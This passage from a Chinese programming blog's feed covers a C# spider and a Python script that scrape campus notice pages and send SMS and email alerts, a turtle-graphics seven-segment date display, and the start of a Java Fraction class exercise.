class="line">            Log.Write( e.Message, <span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">            MessageBox.Show(e.Message, <span class="string">&quot;错误&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>SpiderNotice类:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SpiderNotice</span> : <span class="title">Spider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> url_main;<span class="comment">//各个通知链接的公共部分</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> department;<span class="comment">//所属部门</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> type;<span class="comment">//通知类型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> pattern;<span class="comment">//用于匹配的正则表达式规则</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList all_notice = <span class="keyword">new</span> ArrayList();<span class="comment">//所有的通知</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> parse = <span class="built_in">string</span>.Empty;<span class="comment">//日期的解析规则</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpiderNotice</span>(<span class="params"><span class="built_in">string</span> url, <span class="built_in">string</span> pattern, <span class="built_in">string</span> url_main, <span class="built_in">string</span> department, <span class="built_in">string</span> type</span>) : <span class="title">base</span>(<span class="params">url, <span class="string">&quot;GET&quot;</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">        <span class="keyword">this</span>.pattern = pattern;</span><br><span class="line">        <span class="keyword">this</span>.url_main = url_main;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.parse = <span class="string">&quot;yyyy-MM-dd&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Get</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        all_notice.Clear();</span><br><span class="line">        Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> s = getHtml();</span><br><span class="line">            <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;html&quot;</span>);</span><br><span class="line">            MatchCollection mc = r.Matches(s);</span><br><span class="line">            <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">            &#123;</span><br><span class="line">                GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">                DateTime date = DateTime.ParseExact(<span class="keyword">group</span>[<span class="string">&quot;date&quot;</span>].Value, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class="line">                <span class="built_in">string</span> link = url_main + <span class="keyword">group</span>[<span class="string">&quot;link&quot;</span>].Value;</span><br><span class="line">                Notice n = <span class="keyword">new</span> Notice();</span><br><span class="line">                n.Title = <span class="keyword">group</span>[<span class="string">&quot;title&quot;</span>].Value;</span><br><span class="line">                n.Link = link;</span><br><span class="line">                n.Date = date;</span><br><span class="line">                n.Department = department;</span><br><span class="line">                n.Type = type;</span><br><span class="line">                all_notice.Add(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            BLL.Log.Write(e.Message, <span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">            MessageBox.Show(e.Message, <span class="string">&quot;错误&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Notice <span class="title">index</span>(<span class="params"><span class="built_in">int</span> index</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= all_notice.Count)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfRangeException();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> all_notice[index] <span class="keyword">as</span> Notice;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Notice[] <span class="title">GetAll</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Notice[] All = <span class="keyword">new</span> Notice[all_notice.Count];</span><br><span class="line">        <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> all_notice)</span><br><span class="line">        &#123;</span><br><span class="line">            All[flag++] = t <span class="keyword">as</span> Notice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> All;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Count</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> all_notice.Count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数据模型Notice类:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Notice</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">region</span> 数据模型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> title=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> link=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> DateTime date=DateTime.Now;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> type=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> department=<span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Title</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> title;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            title = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> DateTime Date</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> date;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            date = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Link</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            link = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> link;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Type</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            type = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Department</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> department;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            department = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line">    <span class="function"><span class="keyword">override</span> <span class="keyword">public</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Format(<span class="string">&quot;标题:&#123;0&#125;\n时间:&#123;1&#125;\n链接:&#123;2&#125;\n&quot;</span>, title, date.ToString(<span class="string">&quot;yyyy-MM-dd&quot;</span>), link);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ul>
<li>从不同网站上爬取到的日期格式可能不同，为统一格式，可以使用｀DateTime.ParseExact(datastr, parse, System.Globalization.CultureInfo.InstalledUICulture);｀去解析用于表示日期的字符串，然后再转为统一日期格式的字符串。其中，datastr为表示日期的字符串，parse为解析规则。例:<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> parse=<span class="string">&quot;yyyy-M-D&quot;</span>;</span><br><span class="line">DateTime t=DateTime.ParseExact(<span class="string">&quot;2016-9-5&quot;</span>, parse, System.Globalization.CultureInfo.InstalledUICulture);</span><br><span class="line"><span class="built_in">string</span> str=t.toString(<span class="string">&quot;yyyy-MM-dd&quot;</span>);<span class="comment">//2016-09-05</span></span><br></pre></td></tr></table></figure></li>
<li>不用网页的网页编码格式可能不同，有的为GBK,有的问UTF-8;</li>
<li>用字符串去表达正则表达式的规则时，有两种方法:<ol>
<li>string s&#x3D;@&quot;\d+&quot;&quot;&quot;;字符串前加@表示字符串按常量解析(注意:双引号用两个双引号来表示)</li>
<li>string s&#x3D;&quot;\d+&quot;&quot;;使用转义符</li>
</ol>
</li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>用Python实现校园通知更新提醒</title>
    <url>/posts/45013/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个项目实已经在一个月前已经完成了，一直都想写一篇博客来总结这个过程中遇到的一些问题。但最近一个月来都比较忙，所以一直拖到了现在。<br>首先说说起因吧，我没事的时候，总喜欢依次点开学校主页、教务处、图书馆以及学院的网站，看看有没有什么新通知，虽然大多与我无关。恰逢最近正在学Python，经常听到别人说用Python写爬虫很简单，但自己尚未接触过爬虫。于是抱着试一试的心态看了几篇关于Python爬虫的博客，发现实现起来的确很简单。于是，便一边看着官方的文档说明，一边看着别人的博客，终于完成了自己的第一次爬虫。</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>使用<code>urllib.request</code>库获取到目标url(各个网站的&#39;更多通知&#39;页)的源代码，然后利用Python的<code>re</code>库进行正则匹配，提取到通知相关信息后，与文件中存取的上一次爬取到的信息进行对比。<br>若检测到有新的通知，则利用<code>twilio</code>库向指定手机号码发送SMS，利用<code>smtplib</code>库向指定邮箱发送提醒信息。<br>此外，还具有发送日志以及异常日志的功能。<br>目前仅支持本校的通知提醒，后续会逐步提高项目的通用性。</p>
<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><p>Github地址:<a href="https://github.com/ZhaoQi99/School_Notice">School_Notice</a></p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>安装twilio库:<code>pip install twilio</code></li>
<li>注册twilio账号:<a href="https://www.twilio.com/">Twilio</a></li>
<li>验证手机号:用来接收短信提醒的号码必须在twilio上进行验证</li>
</ul>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="邮件发送"><a href="#邮件发送" class="headerlink" title="邮件发送"></a>邮件发送</h3><ul>
<li>若用名为msg的变量来保存邮件文本，则<code>msg[&#39;From&#39;]</code>以及<code>msg[&#39;To&#39;]</code>必须为实际的发件人地址，否则可能会出现异常:<code>SMTPDataError(code, resp)</code>.如必须写作:<code>msg[&#39;From&#39;] = &#39;xxxxx@qq.com&#39;</code>.我是使用的QQ邮箱来发邮件，至于其他邮箱需不需要这样写还不清楚。 </li>
<li>原本想用一个for循环来实现多人发送，后来发现smtplib库的sendmail方法支持多人发送，但参数应为一个list，故可用<code>str.split(&#39;,&#39;)</code>将字符串转为list。</li>
<li>我使用的是Windows下的Python，若计算机名为中文，则有可能会导致出现异常，可通过右击此电脑-&gt;属性，修改计算机名。</li>
<li>程序代码中使用的邮箱密码不是QQ密码，应在邮箱设置-&gt;账户-&gt;SMTP服务处，获取授权码。</li>
</ul>
<h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><ul>
<li>有时候会接收不到Twilio发送的短信，给10086打电话也没问出个所以然，可能是因为短信中有敏感词(如:学校名)，修改短信内容后就可以了</li>
<li>对上述几个网站的源码使用<code>re.findall</code>后返回的列表中的每个元组中的元素的顺序均为时间、标题、链接，但对学生处网站的源码正则匹配后的元素顺序并不是按照上述顺序的。所以应单独进行调整，但直接修改一个元组中的元素，会出现异常:<code>error:tuple&#39; object does not support item assignment</code>。解决方法是:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(subject_EN == <span class="string">&#x27;snnu_xsc&#x27;</span>):</span><br><span class="line">	new_data = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">		temp = (item[<span class="number">1</span>], item[<span class="number">2</span>], item[<span class="number">0</span>])</span><br><span class="line">        new_data.append(temp)</span><br><span class="line">    data = new_data</span><br></pre></td></tr></table></figure></li>
<li>Python3中的print函数是自动换行的，若不需要自动换行，则可写作:<code>print(str,end=&#39;&#39;)</code></li>
<li>不同网站的编码格式可能不同，应按照各自的编码方式进行解码。若均采用<code>utf-8</code>的方式，则可能会出现各种编码问题，如:<div class="note danger"><p>UnicodeDecodeError: 'utf-8' codec can't decode byte 0xc9 in position 167
</p></div>
解决方法是:
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> find1 == -<span class="number">1</span> &amp; find2 == -<span class="number">1</span>:</span><br><span class="line">	Coding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="comment"># 教务处网页源码编码格式为为gbk</span></span><br><span class="line">	<span class="comment"># 学生处网页源码编码格式为gb2312</span></span><br><span class="line">	Coding = <span class="string">&#x27;gbk&#x27;</span></span><br><span class="line">data = response.read().decode(Coding)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Python程序打包为exe-Pyinstaller"><a href="#Python程序打包为exe-Pyinstaller" class="headerlink" title="Python程序打包为exe(Pyinstaller)"></a>Python程序打包为exe(Pyinstaller)</h2><h3 id="安装及使用"><a href="#安装及使用" class="headerlink" title="安装及使用"></a>安装及使用</h3><ol>
<li>使用<code>pip install pywin32</code>安装pywin32</li>
<li>使用<code>pip install PyInstaller</code>安装Pyinstaller</li>
<li>使用<code>pyinstaller -F main.py</code>即可将Python程序打包为exe程序</li>
</ol>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>打包之前应将用到的第三方库(此项目仅用到Twilio)复制到与要打包的py文件同一目录下。</li>
<li>可使用<code>pyinstaller -F -i logo.ico main.py</code>,为生成的exe程序添加图标</li>
<li>使用的ico文件像素不能过小，否则有可能出现:打包后的程序图标只有在资源管理器中设置为以小图标查看的情况下才显示的是自己的图标，其他情况仍未默认图标</li>
</ul>
<h2 id="使用截图"><a href="#使用截图" class="headerlink" title="使用截图"></a>使用截图</h2><p><img data-src="/images/Screenshot_2018-03-13-09-32-23-47.jpg"><br><img data-src="/images/send_email.jpg"><br><img data-src="/images/20180426015859.jpg"></p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><ol>
<li><a href="https://blog.csdn.net/hanyou11/article/details/50756800">应用python对校园通知的更新进行推送</a></li>
<li><a href="https://blog.csdn.net/zyc121561/article/details/78169168">使用python发短信给自己的手机</a></li>
<li><a href="https://www.cnblogs.com/gopythoner/p/6337543.html">Python打包方法——Pyinstaller</a></li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Twilio</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>用Python绘制七段数码管</title>
    <url>/posts/48183/</url>
    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>数码管是一种价格便宜、使用简单的发光电子器件，广泛应用在价格较低的电子类产品中，其中，七段数码管最为常用。七段数码管<br>（seven-segment indicator）由7 段数码管拼接而成，每段有亮或不亮两种情况，改进型的七段数码管还包括一个小数点位置，如图1 所示。</p>
<span id="more"></span>
<p><img data-src="/images/20171205201558358.jpg"></p>
<p>　　　　　　　　　　　　　　　　　　　　　　　　　　图 1：七段数码管的结构图<br>七段数码管能形成27&#x3D;128 种不同状态，其中部分状态能够显示易于人们理解的数字或字母含义，因此被广泛使用。图2 给出了十六进制中16 个字符的七段数码管表示。<br><img data-src="/images/20171205201607868.jpg"><br>　　　　　　　　　　　　　　　　　　　　　　　　　　图 2：十六进制中16 个字符的七段数码管表示<br>请采用turtle 库并使用函数封装绘制七段数码管，显示当前系统日期和时间。该问题的IPO 描述如下：输入：当前日期的数字形式处理：根据每个数字绘制七段数码管表示输出：绘制当前日期的七段数码管表示程序的预期运行效果如图3 和图4 所示，与两个效果中任何一个相似均可。<br><img data-src="/images/20171205201613806.jpg"><br><img data-src="/images/20171205201625796.jpg"></p>
<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 5, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> turtle,datetime  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawGap</span>():<span class="comment">#画数码管间隔</span></span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawline</span>(<span class="params">flag</span>):<span class="comment">#画单条数码管</span></span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="literal">False</span>):</span><br><span class="line">        turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">40</span>)</span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.right(<span class="number">90</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawdight</span>(<span class="params">dight</span>):<span class="comment">#根据数字绘制对应数字的数码管</span></span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> dight <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">        drawline(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        drawline(<span class="literal">False</span>)</span><br><span class="line">    turtle.setheading(<span class="number">0</span>)</span><br><span class="line">    turtle.fd(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawdata</span>(<span class="params">data</span>):<span class="comment">#根据日期画出对应数字</span></span><br><span class="line">    turtle.color(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;年&#x27;</span>,font=(<span class="string">&quot;宋体&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;月&#x27;</span>,font=(<span class="string">&quot;宋体&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;日&#x27;</span>,font=(<span class="string">&quot;宋体&quot;</span>, <span class="number">24</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            drawdight(<span class="built_in">eval</span>(i))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    turtle.setup(<span class="number">800</span>,<span class="number">500</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(-<span class="number">350</span>)</span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.pensize(<span class="number">6</span>)</span><br><span class="line">    turtle.speed(<span class="number">9</span>)</span><br><span class="line">    drawdata(datetime.datetime.now().strftime(<span class="string">&#x27;%Y+%m-%d*&#x27;</span>))</span><br><span class="line">    a=<span class="built_in">input</span>()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171205202005054.jpg"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>第一周编程题_分数</title>
    <url>/posts/47907/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>设计一个表示分数的类Fraction。这个类用两个int类型的变量分别表示分子和分母。</p>
<p>这个类的构造函数是：<br>Fraction(int a, int b)<br>&#160; &#160; &#160; &#160;构造一个a&#x2F;b的分数。</p>
<span id="more"></span>

<p>这个类要提供以下的功能：<br>double toDouble();<br>&#160; &#160; &#160; &#160;将分数转换double<br>Fraction plus(Fraction r);<br>&#160; &#160; &#160; &#160;将自己的分数和r的分数相加，产生一个新的Fraction的对象。注意小学四年级学过两个分数如何相加的哈。<br>Fraction multiply(Fraction r);<br>&#160; &#160; &#160; &#160;将自己的分数和r的分数相乘，产生一个新的Fraction的对象。<br>void print();<br>&#160; &#160; &#160; &#160;将自己以“分子&#x2F;分母”的形式输出到标准输出，并带有回车换行。如果分数是1&#x2F;1，应该输出1。当分子大于分母时，不需要提出整数部分，即31&#x2F;30是一个正确的输出。</p>
<p>注意，在创建和做完运算后应该化简分数为最简形式。如2&#x2F;4应该被化简为1&#x2F;2。</p>
<p>你写的类要和以下的代码放在一起，并请勿修改这个代码：</p>
<div class="note warnging"><p>
import java.util.Scanner;

<p>public class Main {</p>
<p>public static void main(String[] args) {<br>Scanner in &#x3D; new Scanner(System.in);<br>Fraction a &#x3D; new Fraction(in.nextInt(), in.nextInt());<br>Fraction b &#x3D; new Fraction(in.nextInt(),in.nextInt());<br>a.print();<br>b.print();<br>a.plus(b).print();<br>a.multiply(b).plus(new Fraction(5,6)).print();<br>a.print();<br>b.print();<br>in.close();<br>}<br>}</p>
</p></div>

<p>注意，你的类的定义应该这样开始：</p>
<p><code>class Fraction &#123;</code></p>
<p>也就是说，在你的类的class前面不要有public。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>程序运行时会得到四个数字，分别构成两个分数，依次是分子和分母。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出一些算式。这些输入和输出都是由Main类的代码完成的，你的代码不要做输入和输出。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>2 4 1 3
</p></div>

<h2 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h2><div class="note default no-icon"><p>1/2
1/3
5/6
1
1/2
1/3
</p></div>

<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">First_Week</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(), in.nextInt());</span><br><span class="line">		<span class="type">Fraction</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Fraction</span>(in.nextInt(), in.nextInt());</span><br><span class="line">		a.print();</span><br><span class="line">		b.print();</span><br><span class="line">		a.plus(b).print();</span><br><span class="line">		a.multiply(b).plus(<span class="keyword">new</span> <span class="title class_">Fraction</span>(<span class="number">5</span>, <span class="number">6</span>)).print();</span><br><span class="line">		a.print();</span><br><span class="line">		b.print();</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fraction</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> a;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title 